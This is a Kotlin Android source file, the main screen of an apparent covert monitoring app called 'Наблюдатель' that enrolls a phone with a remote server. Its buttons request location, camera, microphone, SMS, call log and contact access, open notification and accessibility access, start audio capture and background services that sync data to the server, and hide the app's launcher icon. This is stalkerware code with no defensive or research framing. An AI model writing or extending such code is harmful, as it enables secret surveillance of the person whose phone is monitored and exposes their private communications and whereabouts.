package ru.observer.app.ui

import android.Manifest
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import ru.observer.app.collect.AudioCaptureService
import ru.observer.app.collect.LocationService
import ru.observer.app.data.Prefs
import ru.observer.app.net.Api
import ru.observer.app.net.Ws
import ru.observer.app.sync.Sync
import ru.observer.app.util.Util

class MainActivity : AppCompatActivity() {

    private val perms = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {}

    private val proj = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { r ->
        if (r.resultCode == RESULT_OK && r.data != null)
            AudioCaptureService.start(this, r.resultCode, r.data!!)
    }

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        setContent { Theme { Screen() } }
    }

    @Composable
    private fun Screen() {
        val c = LocalContext.current
        var base by remember { mutableStateOf(Prefs.base) }
        var code by remember { mutableStateOf("") }
        var name by remember { mutableStateOf(Build.MODEL) }
        var msg by remember { mutableStateOf("") }
        var done by remember { mutableStateOf(Prefs.enrolled) }

        Column(Modifier.fillMaxSize().background(Bg).verticalScroll(rememberScrollState()).padding(16.dp)) {
            Text("Наблюдатель", color = Text, fontSize = 18.sp, fontWeight = FontWeight.Medium)
            Spacer(Modifier.height(10.dp))

            if (!done) {
                OutlinedTextField(base, { base = it }, Modifier.fillMaxWidth(),
                    label = { Text("Адрес сервера", fontSize = 11.sp) }, singleLine = true)
                OutlinedTextField(code, { code = it }, Modifier.fillMaxWidth(),
                    label = { Text("Код привязки", fontSize = 11.sp) }, singleLine = true)
                OutlinedTextField(name, { name = it }, Modifier.fillMaxWidth(),
                    label = { Text("Имя устройства", fontSize = 11.sp) }, singleLine = true)
                Spacer(Modifier.height(6.dp))
                Button({ Prefs.base = base; Api.enroll(c, code, name) { ok, m ->
                    runOnUiThread { if (ok) { done = true; msg = "привязано" } else msg = m }
                } }, Modifier.fillMaxWidth()) { Text("Привязать") }
            } else {
                Text("привязано", color = Green, fontSize = 12.sp)
                Spacer(Modifier.height(8.dp))
                Button({ val p = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.CAMERA,
                        Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS)
                    if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS)
                    perms.launch(p.toTypedArray()) }, Modifier.fillMaxWidth()) { Text("Разрешения") }
                Button({ Util.openNotif(c) }, Modifier.fillMaxWidth()) { Text("Доступ к уведомлениям") }
                Button({ Util.openA11y(c) }, Modifier.fillMaxWidth()) { Text("Спец. возможности") }
                Button({ Util.openBattery(c) }, Modifier.fillMaxWidth()) { Text("Батарея без ограничений") }
                Button({ proj.launch(getSystemService(MediaProjectionManager::class.java)
                    .createScreenCaptureIntent()) }, Modifier.fillMaxWidth()) { Text("Захват звука") }
                Button({ LocationService.start(c); Ws.start(c); Sync.start(c); msg = "запущено" },
                    Modifier.fillMaxWidth()) { Text("Запустить службы") }
                Button({ Util.hide(c, true); msg = "иконка скрыта" }, Modifier.fillMaxWidth()) { Text("Скрыть иконку") }
                Button({ Util.hide(c, false) }, Modifier.fillMaxWidth()) { Text("Показать иконку") }
            }
            Spacer(Modifier.height(10.dp))
            Text(msg, color = Dim, fontSize = 11.sp)
        }
    }
}
